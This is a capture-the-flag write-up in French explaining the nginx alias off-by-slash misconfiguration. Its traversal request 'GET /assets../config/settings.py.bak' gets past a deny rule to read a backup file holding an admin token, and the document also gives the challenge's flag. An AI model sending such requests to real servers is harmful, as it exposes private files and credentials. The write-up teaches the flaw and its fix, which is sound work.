# alias-slip

| Catégorie | Points | Auteur | Tags |
|---|---|---|---|
| Sysadmin | 150 | hibris, Clawd | sysadmin, nginx, path-traversal, easy |

## Énoncé

On reçoit un instantané d'un site nginx : `nginx.conf` et son arborescence. Un répertoire privé contient une sauvegarde oubliée avec le jeton admin. Aucun fichier ne contient le flag en clair : il faut l'envelopper sous la forme `NCTF{nginx_alias_offbyslash_<token>}`.

## Analyse

Le commentaire de la configuration annonce le défaut :

```nginx
# NOTE: 'location' has no trailing slash but 'alias' does.
location /assets {
    alias /srv/kekeli/public/assets/;
}

location /config {
    deny all;
    return 403;
}
```

C'est le classique *alias traversal*. Comme `location /assets` n'a pas de `/` final, il correspond aussi à `/assets../quelquechose`. nginx remplace alors le préfixe `/assets` par la valeur de l'alias :

```
GET /assets../config/settings.py.bak
 -> /srv/kekeli/public/assets/ + ../config/settings.py.bak
 -> /srv/kekeli/public/config/settings.py.bak
```

La requête ne correspond pas à `location /config`, puisque son URI commence par `/assets`. Le `deny all` ne s'applique donc pas.

La sauvegarde visée est `settings.py.bak`, qui contient `ADMIN_API_TOKEN = "a7f3c0de91"`.

## Résolution

Le challenge étant un instantané hors ligne, il suffit de suivre ce chemin dans les fichiers fournis.

```python
import posixpath, re

print(posixpath.normpath("/srv/kekeli/public/assets/" + "../config/settings.py.bak"))

jeton = re.search(r'ADMIN_API_TOKEN = "(\w+)"', open("settings.py.bak").read()).group(1)
print(f"NCTF{{nginx_alias_offbyslash_{jeton}}}")
```

## Flag

```
NCTF{nginx_alias_offbyslash_a7f3c0de91}
```

## À retenir

`location` et `alias` doivent avoir la même forme : `location /assets/ { alias .../assets/; }`. Les fichiers `.bak` n'ont pas non plus leur place sur un serveur en production.
